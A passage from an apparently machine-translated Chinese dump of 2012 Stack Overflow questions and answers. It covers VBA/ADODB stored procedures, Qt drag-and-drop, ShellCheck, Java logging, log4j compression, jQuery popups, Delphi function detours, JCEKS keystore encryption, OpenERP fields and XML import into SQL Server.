 Dim cmd As New ADODB.Command
    Dim conn As ADODB.Connection
    Dim prm As ADODB.Parameter
    Dim strConn As String

    Set cmd = New ADODB.Command

    KdNr=12564 'Parameter to be passed (set here as dummy)

    cmd.ActiveConnection = CurrentProject.Connection
    cmd.CommandText = "CREATE PROCEDURE procUmsatz " & _
    "(CustNo long) " & _
    "AS SELECT dbo_STATISTIKVK.KUNDE, Sum(dbo_STATISTIKVK.WERTEK) AS WE_Gesamt, Sum(dbo_STATISTIKVK.WERTVK) AS Umsatz_Gesamt, ([Umsatz_Gesamt]-[WE_Gesamt])/[Umsatz_Gesamt] AS Spanne_PC_Gesamt, [Umsatz_Gesamt]-[WE_Gesamt] AS Spanne_EUR_Gesamt, Year([BELEGDAT]) AS Year_, dbo_STATISTIKVK.ARTIKEL INTO tbl_Excel_Umsatz " & _
    "FROM dbo_STATISTIKVK " & _
    "WHERE (((dbo_STATISTIKVK.MENGE)>0) AND ((dbo_STATISTIKVK.BELEGDAT)>#1/1/2010#)) " & _
    "GROUP BY dbo_STATISTIKVK.KUNDE, Year([BELEGDAT]), dbo_STATISTIKVK.ARTIKEL " & _
    "HAVING (((dbo_STATISTIKVK.KUNDE)= [CustNo]) AND ((Sum(dbo_STATISTIKVK.WERTVK))>0) AND ((dbo_STATISTIKVK.ARTIKEL)<>""VERSAND"" And (dbo_STATISTIKVK.ARTIKEL)<>""99"" And (dbo_STATISTIKVK.ARTIKEL)<>""MAN"" And (dbo_STATISTIKVK.ARTIKEL)<>""Manuell"")) " & _
    "ORDER BY Year([BELEGDAT])"

    cmd.Execute

    '--------------------------------------------------------------------------

    strConn = "Provider = Microsoft.Jet.OLEDB.4.0;" & _
    "Data Source=\\STATION\PasstProReloaded\Excel.mdb"

    Set conn = New ADODB.Connection
    conn.Open strConn

    Set cmd = New ADODB.Command
    cmd.CommandText = "procUmsatz"
    cmd.CommandType = adCmdStoredProc
    cmd.ActiveConnection = conn

    Set prm = cmd.CreateParameter("CustNo", adInteger, adParamInput)
    cmd.Parameters.Append prm
    cmd.Parameters("CustNo").Value = KdNr

    'Execute the Stored Procedure
    cmd.Execute

    'Close the connection
    conn.Close 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T10:19:55.143

尝试移动一下，Excel 不太可能有活动连接：

```
strConn = "Provider = Microsoft.Jet.OLEDB.4.0;" & _
"Data Source=\\STATION\PasstProReloaded\Excel.mdb"

Set conn = New ADODB.Connection
conn.Open strConn

cmd.ActiveConnection = strConn
cmd.CommandText = "CREATE PROCEDURE procUmsatz " & _
"(CustNo long) " & _
"AS SELECT dbo_STATISTIKVK.KUNDE, Sum(dbo_STATISTIKVK.WERTEK) AS WE_Gesamt, Sum(dbo_STATISTIKVK.WERTVK) AS Umsatz_Gesamt, ([Umsatz_Gesamt]-[WE_Gesamt])/[Umsatz_Gesamt] AS Spanne_PC_Gesamt, [Umsatz_Gesamt]-[WE_Gesamt] AS Spanne_EUR_Gesamt, Year([BELEGDAT]) AS Year_, dbo_STATISTIKVK.ARTIKEL INTO tbl_Excel_Umsatz " & _
"FROM dbo_STATISTIKVK " & _
"WHERE (((dbo_STATISTIKVK.MENGE)>0) AND ((dbo_STATISTIKVK.BELEGDAT)>#1/1/2010#)) " & _
"GROUP BY dbo_STATISTIKVK.KUNDE, Year([BELEGDAT]), dbo_STATISTIKVK.ARTIKEL " & _
"HAVING (((dbo_STATISTIKVK.KUNDE)= [CustNo]) AND ((Sum(dbo_STATISTIKVK.WERTVK))>0) AND ((dbo_STATISTIKVK.ARTIKEL)<>""VERSAND"" And (dbo_STATISTIKVK.ARTIKEL)<>""99"" And (dbo_STATISTIKVK.ARTIKEL)<>""MAN"" And (dbo_STATISTIKVK.ARTIKEL)<>""Manuell"")) " & _
"ORDER BY Year([BELEGDAT])"

cmd.Execute 
```

编辑重新评论

```
KdNr=12564 'Parameter to be passed (set here as dummy)

strConn = "Provider = Microsoft.Jet.OLEDB.4.0;" & _
"Data Source=\\STATION\PasstProReloaded\Excel.mdb"

Set conn = New ADODB.Connection
conn.Open strConn

cmd.ActiveConnection = strConn

cmd.CommandText = "SELECT dbo_STATISTIKVK.KUNDE, Sum(dbo_STATISTIKVK.WERTEK) AS WE_Gesamt, Sum(dbo_STATISTIKVK.WERTVK) AS Umsatz_Gesamt, ([Umsatz_Gesamt]-[WE_Gesamt])/[Umsatz_Gesamt] AS Spanne_PC_Gesamt, [Umsatz_Gesamt]-[WE_Gesamt] AS Spanne_EUR_Gesamt, Year([BELEGDAT]) AS Year_, dbo_STATISTIKVK.ARTIKEL INTO tbl_Excel_Umsatz " & _
"FROM dbo_STATISTIKVK " & _
"WHERE (((dbo_STATISTIKVK.MENGE)>0) AND ((dbo_STATISTIKVK.BELEGDAT)>#1/1/2010#)) " & _
"GROUP BY dbo_STATISTIKVK.KUNDE, Year([BELEGDAT]), dbo_STATISTIKVK.ARTIKEL " & _
"HAVING (((dbo_STATISTIKVK.KUNDE)= [CustNo]) AND ((Sum(dbo_STATISTIKVK.WERTVK))>0) AND ((dbo_STATISTIKVK.ARTIKEL)<>'VERSAND' And (dbo_STATISTIKVK.ARTIKEL)<>'99' And (dbo_STATISTIKVK.ARTIKEL)<>'MAN' And (dbo_STATISTIKVK.ARTIKEL)<>'Manuell')) "

Set prm = cmd.CreateParameter("CustNo", adInteger, adParamInput)
cmd.Parameters.Append prm
cmd.Parameters("CustNo").Value = KdNr

''Debugging
Debug.Print cmd.CommandText
Stop
''End of debugging
cmd.Execute 
```

备选方案，其中查询已作为 procUmsatz 存在于 MS Access 中

```
strConn = "Provider = Microsoft.Jet.OLEDB.4.0;" & _
"Data Source=\\STATION\PasstProReloaded\Excel.mdb"

Set conn = New ADODB.Connection
conn.Open strConn

Set cmd = New ADODB.Command
cmd.ActiveConnection = strConn
cmd.CommandText = "procUmsatz"
cmd.CommandType = adCmdStoredProc
cmd.ActiveConnection = conn

Set prm = cmd.CreateParameter("CustNo", adInteger, adParamInput)
cmd.Parameters.Append prm
cmd.Parameters("CustNo").Value = KdNr

'Execute the Stored Procedure
cmd.Execute 
```

# qt - 如何在自定义 QTextEdit 中接受来自 QListWidget 的拖放

> ID：10597444
> 
> 赞同：3
> 
> 时间：2012-05-15T09:04:36.740
> 
> 标签：qt, drag-and-drop

在我自己的 TextEdit（继承`QTextEdit`）中，我实现了这个 DragEventHandler：

```
void CustomTextEdit::dragEnterEvent(QDragEnterEvent* e)
{
    qDebug() << "void CustomTextEdit::dragEnterEvent(QDragEnterEvent* e)";
    qDebug() << "e->mimeData()->hasText() is" << e->mimeData()->hasText();

    QTextEdit::dragEnterEvent(e);
} 
```

示例：当我在 TextEdit 中选择文本并拖动它时，处理程序被调用并且`hasText()`是`true`.

当我将一个项目从 a`QListWidget`拖到 TextEdit 中时，处理程序也会被调用，但`hasText()`它是`false`. 无论如何，我该如何处理 DropEvent ？（`QDragEnterEvent`基本上是一个`QDropEvent`）

我知道这将在 DropHandler 中完成，但我的问题是 **DropEvent 来自`QListWidget`包含哪些信息？** 如何访问这些信息？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T12:43:41.143

您可以使用 询问`QDragEnterEvent`它包含哪些格式的 mime 数据[`QMimeData::formats()`](http://qt-project.org/doc/qt-4.8/qmimedata.html#formats)。

例如：

```
const QMimeData *mimeData = e->mimeData();
QStringList mimeFormats = mimeData->formats();
foreach(QString format, mimeFormats)
  qDebug() << format; 
```

从这里我们可以看到事件的`mimeData`格式是`application/x-qabstractitemmodeldatalist`.

可以使用 检索任何特定格式的数据[`QMimeData::data(QString mimeType)`](http://qt-project.org/doc/qt-4.8/qmimedata.html#data)，尽管在 的情况下`application/x-qabstractitemmodeldatalist`，数据以非常特定的方式编码。这个先前的 SO 问题涵盖了从`QByteArray`返回的数据中解码数据`QMimeData::data`：[如何在 Qt 中解码“application/x-qabstractitemmodeldatalist”以进行拖放？](https://stackoverflow.com/questions/1723989/how-to-decode-application-x-qabstractitemmodeldatalist-in-qt-for-drag-and-drop)

# shell - 是否有任何 shell 脚本和/或 Makefile 静态代码分析器？

> ID：10597445
> 
> 赞同：2
> 
> 时间：2012-05-15T09:04:36.860
> 
> 标签：shell, makefile, static-code-analysis, syntax-checking

或者如何确保我的 Makefile/脚本的可靠性？

更新：shell 脚本是指 sh 方言（bash、zsh 等），Makefile 是指 GNU make。我知道，它们是不同的野兽，但它们有许多共同点。

PS 是的，我知道，静态代码分析无法验证所有可能的情况，并且我需要以某种可靠的方式编写我的 Makefile 和 shell 脚本。我只需要工具，它会告诉我，当我使用不良做法时，当我忘记它们或在大脚本中没有注意到时。不是为我修复错误，而是再看一遍。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-21T18:15:39.457

对于 sh 脚本，[ShellCheck](http://www.vidarholen.net/contents/shellcheck/)会做一些静态分析检查，例如检测变量修改何时被子 shell 隐藏、何时意外使用`[ $foo=bar ]`或何时忽略引用可能包含空格的变量。它还评论了一些文体问题，例如在可以使用参数扩展时无用使用 cat 或使用 sed。

# android - 在 android 中找到具有特定商品的商店

> ID：10597446
> 
> 赞同：0
> 
> 时间：2012-05-15T09:04:42.480
> 
> 标签：android

在我的应用程序中，当用户选择特定商品时，会有一个商品列表，谷歌地图将显示用户可以购买该商品的可能商店。基本上，我知道如何处理 google map api，但是我不太清楚如何获取真实物品然后将其定位到真实商店。谁能建议我一些方法来做到这一点？谢谢

顺便问一下，google play上有类似的应用吗？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:14:06.757

可能您对[google places](https://developers.google.com/maps/documentation/places/) api 感兴趣...

# java - 如何在线程中关闭 FileHandlers？

> ID：10597447
> 
> 赞同：2
> 
> 时间：2012-05-15T09:04:46.287
> 
> 标签：java, multithreading, java.util.logging, filehandler

`FileHandler`一旦线程完成或强制完成，我想关闭所有s 。
我创建了一个`closeLogger`函数，但它似乎没有被调用
，因为我看到该文件仍被锁定在文件夹中。

1.  问题是什么？
2.  如果我在eclipse中强行终止执行，我也可以处理吗？

我的代码如下：

```
public class Passenger extends Thread {

    private Logger logger;

    public Passenger() throws SecurityException, IOException, InterruptedException {
        logger = Logger.getLogger(String.format("Passenger%sLogger", name));
        FileHandler fileHandler = new FileHandler(String.format(".\\Logs\\PassengerLogs\\passenger_%s.txt", name), true);
        fileHandler.setFormatter(new LogFormatter());
        logger.addHandler(fileHandler);
    }

    @Override
    public void run() {
        try {
            goToStation();
            waitForTaxi();
            if (passengerState == PassengerState.WatingInQueue) {
                goHome();
            } else { // already in taxi
                synchronized (this) {
                    wait();
                }
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            closeLogger();
        }
    }

    private void closeLogger() {
        Logger logger = getLogger();
        java.util.logging.Handler[] handlers = logger.getHandlers();
        for (java.util.logging.Handler h : handlers) {
            try {
                h.close();
            } catch (SecurityException e) {}
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T14:45:44.217

由于您使用 addHandler() 添加处理程序，因此干净的方法是 close() 然后调用 removeHandler()

[见 removeHandler](http://docs.oracle.com/javase/6/docs/api/java/util/logging/Logger.html#removeHandler%28java.util.logging.Handler%29)

另外，从上面的链接复制：

> After passing this initial (cheap) test, the Logger will allocate a LogRecord to describe the logging message. It will then call a Filter (if present) to do a more detailed check on whether the record should be published. If that passes it will then publish the LogRecord to its output Handlers. **By default, loggers also publish to their parent's Handlers, recursively up the tree**.

So if you are not removing handler, it will still hold reference. This may be the reason why your file is still locked. Try this and let me know if it works!

# javascript - 需要做一个垂直的时间线

> ID：10597448
> 
> 赞同：4
> 
> 时间：2012-05-15T09:04:52.293
> 
> 标签：javascript, jquery, timeline

我需要制作一个垂直的 javascript 时间线，如下面的链接，现在是用 flash 创建的。有人可以给我一个参考插件吗？或者请建议我是否可以使用平面 javascript 或 javascript 框架。我对平面 javascript 和 jquery 有一点想法。

[http://www.guardian.co.uk/world/interactive/2011/mar/22/middle-east-protest-interactive-timeline](http://www.guardian.co.uk/world/interactive/2011/mar/22/middle-east-protest-interactive-timeline)

我对此做了一些研究。但是没有得到什么好的结果。

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T09:08:25.520

[https://github.com/balancemedia/](https://github.com/balancemedia/Timeline)

时间线 演示：[http ://builtbybalance.com/github-timeline/](http://builtbybalance.com/github-timeline/)

可能还有更多：[https ://github.com/search?langOverride=&language=JavaScript&q=timeline&repo=&start_value=1&type=Repositories](https://github.com/search?langOverride=&language=JavaScript&q=timeline&repo=&start_value=1&type=Repositories)

一个很好的教程： [http ://www.9lessons.info/2012/01/facebook-timeline-design-using-jquery.html](http://www.9lessons.info/2012/01/facebook-timeline-design-using-jquery.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:18:40.623

整个事情是在闪存中完成的。您可以在 javascript 中实现这一点（绝对使用 css），但没有直接的方法。即使在闪存中，它也不是以直接的方法完成的。同步时间线和事件路径的移动需要一些努力。从使用 javascript 和 css 开发自定义滚动条开始，然后开发其余部分。

# java - 带压缩的日志旋转

> ID：10597455
> 
> 赞同：3
> 
> 时间：2012-05-15T09:05:16.230
> 
> 标签：java, logging, log4j

我们在 Linux 服务器中部署了非常古老的应用程序。`RollingFileAppender` 由于磁盘空间问题，我们正在使用删除旧日志。

每当我们在应用程序中遇到问题时，大多数日志都不会在磁盘中可用。如果我们压缩日志文件，我们可以保留 100 个日志文件来代替一个未压缩的日志文件。

有没有办法在日志文件填满后压缩文件并在某个时间点后删除它们*[比如说一周。]*

我试过了`DailyRollingFileAppender`，但它没有按照我们期望的方式工作。

最大日志限制为 500。但应用程序每小时创建 200 个日志。我们可能无法获得包含错误消息的实际日志。因此，我们计划压缩所有日志文件并在一周后将其删除。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:47:26.327

是的，请检查此[链接](http://logging.apache.org/log4j/companions/extras/index.html)。它对此有支持。将此添加到 RollingFileAppender 配置。

```
<appender...>
    <rollingPolicy class="org.apache.log4j.rolling.TimeBasedRollingPolicy">
      <param name="FileNamePattern" value="/wombat/foo.%d{yyyy-MM}**.gz**"/>
    </rollingPolicy>
</appender> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:09:37.720

我不知道 log4j 是否支持这一点，但如果你转向 logback，你就有这种可能性。

[http://logback.qos.ch/](http://logback.qos.ch/)

哈乔

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T09:36:22.733

是的，shell 脚本或 cron [http://unixhelp.ed.ac.uk/CGI/man-cgi?crontab+5](http://unixhelp.ed.ac.uk/CGI/man-cgi?crontab+5) 可以很容易地解决您的问题

# jquery - 页面大小更改时中心jquery弹出框

> ID：10597459
> 
> 赞同：0
> 
> 时间：2012-05-15T09:05:25.460
> 
> 标签：jquery, popup, size, center

我正在使用 jQuery 弹出窗口，只是想知道当我更改浏览器窗口宽度时如何使框保持居中，目前它在页面加载时获取中心点并在我更改宽度时保持在该位置。

这是我用于弹出功能的代码：

```
 //Popup dialog
 function popup(message) {

// get the screen height and width  
var maskHeight = $(document).height();  
var maskWidth = $(window).width();

// calculate the values for center alignment     
var dialogLeft = (maskWidth/2) - ($('#dialog-box').width())/2; 

// Set overlay to fill screen
$("#dialog-overlay").css("width","100%").fadeIn();

// Set dialogue box 80px from top and central
$('#dialog-box').css({top:80, left:dialogLeft}).fadeIn();

// display the message
//$('#dialog-message').html(message);

// Close button fades out overlay and message   
$('.button').live('click',function()
{
    $(this).parent().fadeOut();
    $('#dialog-overlay').fadeOut();
    return false;
});

 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:08:45.940

JavaScript 解决方案是`window.onresize`在窗口大小发生任何事情时触发它。

```
window.onresize = function() {
    var maskWidth = $(window).width();
    var dialogLeft = (maskWidth/2) - ($('#dialog-box').width())/2; 
    $('#dialog-box').css({top:80, left:dialogLeft});
} 
```

可能最好将内部代码放入函数中以节省重复。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:09:30.847

除非您需要支持 IE6，否则使用 position:fixed 并在 CSS 而不是 JS 中完成大部分工作可能是有意义的。

例如

```
#dialog-overlay {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
}

#dialog-box {
    position: fixed;
    top: 50%;
    left: 50%;
    width: 400px;
    height: 500px;
    margin: -250px 0 0 -200px; /* width and height divided by 2 */
} 
```

但是，这假设您有一个固定的宽度/高度对话框。

# objective-c - UITableView 自定义类以编程方式？

> ID：10597460
> 
> 赞同：1
> 
> 时间：2012-05-15T09:05:25.823
> 
> 标签：objective-c, ios, xcode, uitableview, interface-builder

我想知道这是怎么回事： ![在此处输入图像描述](../Images/4fac78bb8b3054436fab6e8534a61c1a.png)

可以以编程方式完成吗？它只是设置 uitableview 数据源并委托给`FadingTableView`类吗？在 IB 中设置自定义类到底发生了什么？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:17:34.977

在这里，您告诉 IB 表视图实例实际上是`FadingTableView`.
如果您想以编程方式创建此表视图，请使用这些行

```
FadingTableView *tableView = [[FadingTableView alloc] init.....]; 
```

为什么在 IB 中设置该类是因为 IB 具有内置对象，`UITableView`但您想要 IB 中不存在的表视图，因此您将类名放在那里，以便它创建实例`FadingTableView`而不是`UITableView`.
不，它不用于连接数据源或委托。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:23:24.677

这样做是使用您在源代码中提供的 UITableView 的子类（显然），并在加载 nib 时实例化它。IT 并不意味着`datasource`并且`delegate`是相互关联的。

要在代码中执行相同的操作，您必须从 xib 文件中删除 TableView 并在`viewDidLoad`表示该 xib 文件的 ViewController 中使用、手动`[[FadingTableView alloc] init…]`设置`frame`、外观和所有其他属性来创建它。`delegate``datasource`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T09:15:30.047

请详细说明您的问题，因为它并不表示它的目的..我认为您是在询问通过 xib 连接数据源和委托和通过类以编程方式声明它之间的区别。它们之间没有太大区别，但如果你在逻辑上看到 IBAction 和 IBOutlet 只是让编译器知道对象已经通过接口生成器定义的标识符（现在在更高版本的 xCode 中与 xcode 集成）。IBAction 被定义为 void 而 IBOutlet 刚刚定义。Apple的定义如下： -

```
#ifndef IBOutlet
#define IBOutlet 
#endif  

#ifndef 
IBAction #define 
IBAction void 
#endif 
```

两者都充当编译器的标识符，仅此而已。它只是告诉编译器某些方法是通过接口构建器定义的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-04-16T07:08:18.770

您可以使用`object_setClass(tableView, [CustomClass class]);`并且必须包括`#include <objc/runtime.h>`

# delphi - 如何在 FastcodeAddressPatch 之后访问替换过程

> ID：10597462
> 
> 赞同：3
> 
> 时间：2012-05-15T09:05:40.497
> 
> 标签：delphi

我试图用我自己的版本即时替换 Delphi 内置函数。

```
function ShortCutToTextOverride(ShortCut: TShortCut): string;
begin
  if SomeCondition then
    Result := Menus.ShortCutToText // after patching the pointer equals ShortCutToTextOverride
  else
  begin
    // My own code goes here
  end;
end;

FastcodeAddressPatch(@Menus.ShortCutToText, @ShortCutToTextOverride); 
```

打补丁后，原来的功能就不能用了。无论如何都可以访问它吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T09:32:31.890

恐怕不会：第一个字节被跳转到新函数所覆盖。

您可以使用 KOLDetours.pas：它返回指向蹦床的指针（原来的前几个字节被绕道覆盖）。 [http://code.google.com/p/asmprofiler/source/browse/trunk/SRC/KOLDetours.pas](http://code.google.com/p/asmprofiler/source/browse/trunk/SRC/KOLDetours.pas)

例如：

```
type
  TNowFunction = function:TDatetime;
var
  OrgNow: TNowFunction;
function NowExact: TDatetime;
begin
  //exact time using QueryPerformanceCounter
end; 

initialization
  OrgNow := KOLDetours.InterceptCreate(@Now, @NowExact);
  Now()     -> executes NowExact() 
  OrgNow()  -> executes original Now() before the hook 
```

# java - JCEKS keyStore 在 JavaTM Cryptography Extension 中使用的加密..？

> ID：10597469
> 
> 赞同：6
> 
> 时间：2012-05-15T09:05:51.633
> 
> 标签：java, encryption

在`JCEKS`key 存储使用的算法以及 key 的大小。
我找到了它使用的东西`Triple DES`

但是密钥大小是多少..？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T18:43:39.520

目前，JCEKS 密钥库中的每个`PrivateKey`条目`SecretKey`都使用 CBC 模式下的 3 密钥三重 DES 和 PKCS #5 填充进行加密。这具有 112 位的有效加密强度，尽管密钥是 168 位加上 24 个奇偶校验位，总共 192 位。

该密钥（和初始化向量）是使用专有的基于 MD5 的算法从密码中派生的。通常，从密钥派生初始化向量会破坏目的，但每个条目也有一个唯一的盐用于密钥派生。这意味着派生密钥和初始化向量对于每个条目都是唯一的。

您可以在源代码中研究[密码的使用](http://www.docjar.com/html/api/com/sun/crypto/provider/KeyProtector.java.html)和[密码本身。](http://www.docjar.com/html/api/com/sun/crypto/provider/PBEWithMD5AndTripleDESCipher.java.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-23T21:29:40.973

JCEKS 是另一种专有密钥库格式，可从 JCE（Java Cryptography Extension）中的“SunJCE”提供程序获得。

如果您不使用 JCE，那么您将使用 JKS 密钥库。但是，如果您已经安装了 JCE 并且正在使用 JCE 功能，那么最好的选择是 JCEKS 密钥库。此密钥库通过使用三重 DES 加密为存储的私钥提供更强大的保护。

# openerp - 如何计算 OpenERP 中两个功能字段的和/差

> ID：10597470
> 
> 赞同：1
> 
> 时间：2012-05-15T09:06:02.813
> 
> 标签：openerp

我在 OpenERP 中有两个未存储在数据库中的功能字段。事实上，它们在数据库中没有列。它们是从其他表中即时计算的。我希望能够计算它们的总和或差异。我在这里看到了一些东西（[计算字段的总和](https://stackoverflow.com/questions/7318813/openerp-function-fields)），但我认为它会去数据库获取数据。请问我怎样才能做到这一点。将数据存储在数据库中并从那里提取数据的最佳选择是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T11:10:49.977

它们可以是替代解决方案，例如定义第三个计算字段并使用“multi=''”并计算差异，您可以将第三个字段保存在 db 中，或者如果您需要稍后的外部使用，您可以使其保持动态。

此处的优势将是在计算第三个字段的 2 个字段存储差异之后。

示例代码片段如下：

```
class code_play(osv.osv):
_name = 'code.play'

def _calc_function(self, cr, uid, ids, fields_list, args, context=None):
    vals = {}
    for id in ids:
        fields = {}
        for field in fields_list:
            fields[field] = 10
        fields["calc3"] = fields['calc1'] + fields['calc2']
        vals[id] = fields
    return vals       

_columns = {
    'name': fields.char('Name', required=True, size=50),
    'calc1': fields.function(_calc_function, type='integer', store=False, multi="compute_person_data"),
    'calc2': fields.function(_calc_function, type='integer', store=False, multi="compute_person_data"),
    'calc3': fields.function(_calc_function, type='integer', store=False, multi="compute_person_data"),
} 
```

正如我再次解释的那样，将计算带有 multi 的字段，但函数相同，因此返回类型将是

```
 # when called with ``ids=[1,2,3]``, ``compute_person_data`` could return:
    {
        1: {'calc1': 10, 'calc2': 10, 'calc3': 20},
        2: {'calc1': 10, 'calc2': 10, 'calc3': 20},
        3: {'calc1': 10, 'calc2': 10, 'calc3': 20}
    } 
```

问候

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T11:15:58.907

您可以将函数字段与 multi 关键字组合并在一个函数中计算它们，然后添加第三个函数字段会很容易。

```
class your_class(osv.osv):
    _inherit = 'whatever'

    def calc_fields(self, cr, uid, ids, fields, arg, context=None):
        res = {}
        for record in self.browse(cr, uid, ids, context=context):
            res[record.id] = {
                'field1': 5, # Calculate the field values here
                'field2': 3, 
                'field3': 5+3,
            }
        return res

    _columns = {
        'field1': fields.function(calc_fields, multi='my_combination', string='Field 1'),
        'field2': fields.function(calc_fields, multi='my_combination', string='Field 2'),
        'field3': fields.function(calc_fields, multi='my_combination', string='Field 1 + Field 2'),
    }
your_class() 
```

请记住，此示例已简化并且缺少函数字段的“type”关键字，只是为了保持此示例干净并指出“multi”关键字的重要性

# c# - 如何借助 Microsoft 提供的工具将 XML 分解为关系数据库？

> ID：10597471
> 
> 赞同：1
> 
> 时间：2012-05-15T09:06:03.797
> 
> 标签：c#, xml, linq, sql-server-2008

我的组织正在使用[Adlib 软件](http://www.adlibsoft.com/)来存储有关我们拥有的所有资源的信息。
我的项目是通过一个网站向访问者提供这些数据，该网站为访问者提供一个界面来搜索这些资源。

Adlib 供应商提供的 API 给了我 XML[单击此处查看那些 API 返回的 xml 示例](http://test2.adlibsoft.com/api/wwwopac.ashx?database=collect.inf&search=all&xmltype=grouped)。我的项目需要将 XML 分解为 MS SQL 关系数据库。

根据我的问题，我得到的 XML 是非结构化的，我无法决定应该使用什么来分解，比如,`Open XML`或其他任何东西（我不知道！）。 我只想维护本地数据库，以便网站可以将其用作只读目的，访问者可以搜索资源。`select for XML``Xquery`

```
 <adlibXML>
<recordList>
<record priref="1" selected="False">
<Acquisition_source>
<acquisition.source>Parker, Mrs</acquisition.source>
<acquisition.source.lref>2</acquisition.source.lref>
<acquisition.source.type/>
</Acquisition_source>
<Alternative_number>
<alternative_number>1964.517</alternative_number>
<alternative_number.type>Collection number</alternative_number.type>
</Alternative_number>
<collection>TEXTILES</collection>
<collection.lref>1</collection.lref>
<Condition>
<condition.date>1999-01</condition.date>
<condition.notes>
<value lang="">Bottom right corner, worn and now frayed.</value>
</condition.notes>
</Condition>
<current_location>Room 20 - Cube</current_location>
<current_location.lref>3500</current_location.lref>
<current_location.type/>
<Description>
<description>
The top is in white cotton with pieced and appliqué patchwork in dress prints; the back is in white cotton. Cotton wool padding. Patchwork forms a square in white border; centre and corners of square are panels of appliqué (hearts, birds, clover leafs etc). Sides of square are pieced pieces; quilting follows patchwork with border quilted in large diamonds, and each containing a form four-hearts spray. Very neatly and prettily worked. Worked by donor's grandmother, Mrs Rebecca Temperley, possibly for her wedding in 1860\. Prov: Mrs. Parker.
</description>
</Description>
<Dimension>
<dimension.notes/>
<dimension.part/>
<dimension.precision/>
<dimension.type>Length</dimension.type>
<dimension.type.lref>15</dimension.type.lref>
<dimension.unit>cm</dimension.unit>
<dimension.unit.lref>16</dimension.unit.lref>
<dimension.value>270</dimension.value>
</Dimension>
<Dimension>
<dimension.notes/>
<dimension.part/>
<dimension.precision/>
<dimension.type>Width</dimension.type>
<dimension.type.lref>14</dimension.type.lref>
<dimension.unit>cm</dimension.unit>
<dimension.unit.lref>16</dimension.unit.lref>
<dimension.value>270</dimension.value>
</Dimension>
<documentation.free_text>Patchwork Quilts / Colby, Averil p. 59</documentation.free_text>
<documentation.free_text>Quilts / Baird, Ljiljana p. 35</documentation.free_text>
<documentation.free_text>Patchwork Quilt Tsushin p. 21</documentation.free_text>
<documentation.free_text>North Country Quilting</documentation.free_text>
<documentation.free_text>
North Country Quilts: Legend and Living Tradition / Osler, Dorothy p. 23
</documentation.free_text>
<Edit>
<edit.date>2012-04-12</edit.date>
<edit.name>bridget.westmacott</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>09:49:34</edit.time>
</Edit>
<Edit>
<edit.date>2012-04-12</edit.date>
<edit.name>bridget.westmacott</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>09:49:06</edit.time>
</Edit>
<Edit>
<edit.date>2012-04-10</edit.date>
<edit.name>bridget.westmacott</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>09:34:24</edit.time>
</Edit>
<Edit>
<edit.date>2012-02-16</edit.date>
<edit.name>darren.stirk</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>14:28:23</edit.time>
</Edit>
<Edit>
<edit.date>2012-02-16</edit.date>
<edit.name>siddharth.pandey</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>13:35:34</edit.time>
</Edit>
<Edit>
<edit.date>2012-02-16</edit.date>
<edit.name>siddharth.pandey</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>13:28:51</edit.time>
</Edit>
<Edit>
<edit.date>2011-01-07</edit.date>
<edit.name>bridget.westmacott</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>10:02:11</edit.time>
</Edit>
<Edit>
<edit.date>2011-01-07</edit.date>
<edit.name>bridget.westmacott</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>10:01:49</edit.time>
</Edit>
<Edit>
<edit.date>2011-01-07</edit.date>
<edit.name>bridget.westmacott</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>09:54:17</edit.time>
</Edit>
<Edit>
<edit.date>2011-01-07</edit.date>
<edit.name>bridget.westmacott</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>09:48:09</edit.time>
</Edit>
<Edit>
<edit.date>2007-04-17</edit.date>
<edit.name>bridget.westmacott</edit.name>
<edit.source>collect>intern</edit.source>
<edit.time>10:37:52</edit.time>
</Edit>
<Exhibition>
<exhibition>North Country Quilting</exhibition>
<exhibition.catalogue_number/>
<exhibition.date.end>1963-10-01</exhibition.date.end>
<exhibition.date.start>1963-07-12</exhibition.date.start>
<exhibition.lref>1</exhibition.lref>
<exhibition.notes>
Wedding quilt, pieced and appliquéd in plain and printed cottons. Quilted in a bordered design. Made by Rebecca Temperley of Allendale, Northumberland, c. 1860 Q.18 (No. 4 in Booklet)
</exhibition.notes>
<exhibition.organiser/>
<exhibition.reference_number/>
<exhibition.venue/>
<exhibition.venue.place/>
</Exhibition>
<Exhibition>
<exhibition>Shipley Art Gallery</exhibition>
<exhibition.catalogue_number/>
<exhibition.date.end>1983-04-01</exhibition.date.end>
<exhibition.date.start>1983-03-01</exhibition.date.start>
<exhibition.lref>2</exhibition.lref>
<exhibition.notes/>
<exhibition.organiser/>
<exhibition.reference_number/>
